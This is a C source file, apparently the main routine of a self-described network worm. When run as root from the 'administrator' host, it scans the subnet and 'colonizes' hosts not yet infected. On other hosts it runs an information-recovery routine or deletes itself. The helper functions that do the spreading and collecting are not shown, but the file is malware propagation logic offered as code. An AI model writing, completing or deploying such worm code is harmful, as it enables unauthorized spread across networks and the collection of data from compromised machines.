#include "../include/main.h"

int main(int argc, char **argv) 
{
	char *worm_name, *admin_ip;
	struct in_addr *hosts_list;
	struct in_addr admin_host;
	int cpt = 0;
	int ret = EXIT_FAILURE;	

	// get the worm name
	worm_name = basename(argv[0]);

	// enter into the worm directory
	chdir(dirname(argv[0]));

	// read the configuration file
	readConfig();

	// get the administrator ip address
	admin_ip = iniparser_getstring(params, "Administrator:ip", NULL);

	// if the program is launched by root
	if (isRoot()) {
		// if the host is the administrator
		if (isSourceHost()) {
			hosts_list = scanNetwork();
			inet_aton(admin_ip, &admin_host);
			while (true) {
				// if the target host and the administrator host are in the same subnet
				if (inet_netof(hosts_list[cpt]) == inet_netof(admin_host)) {
					// if the host is not already colonized
					if (!isAlreadyColonized(inet_ntoa(hosts_list[cpt]), worm_name))
						colonize(inet_ntoa(hosts_list[cpt]), worm_name);
					cpt++;
				}
				else
					break;
			}
		}
		else {
			// if the worm is authorized to be executed
			if (isAuthorized())
				infosRecovery();
			else
				wormDelete(worm_name);
		}
		ret = EXIT_SUCCESS;
	}
	iniparser_freedict(params);

	return ret;
}

